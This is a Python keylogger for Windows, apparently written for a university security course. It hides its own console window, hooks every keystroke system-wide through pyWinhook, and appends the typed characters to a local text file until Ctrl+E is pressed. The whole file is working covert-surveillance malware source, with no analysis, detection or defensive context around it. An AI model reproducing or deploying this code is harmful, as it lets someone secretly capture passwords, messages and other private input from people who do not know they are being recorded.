import win32api
import win32console
import win32gui
import pythoncom
import pyWinhook as pyHook

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def OnKeyboardEvent(event):
    try:
        if event.Ascii == 5:
            exit(1)
        if event.Ascii != 0 or event.Ascii == 8:
            # open output.txt to read current keystrokes
            with open("C:/Users/neera/OneDrive/Documents/MITWPU/ICS/ICS LCA/key.txt", 'r+') as f:
                buffer = f.read()
            # open output.txt to write current + new keystrokes
            with open("C:/Users/neera/OneDrive/Documents/MITWPU/ICS/ICS LCA/key.txt", 'w') as f:
                keylogs = chr(event.Ascii)
                if event.Ascii == 13:
                    keylogs = '\n'
                buffer += keylogs
                f.write(buffer)
    except Exception as e:
        print(f"Exception: {e}")
        return True
    return True

# create a hook manager object
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
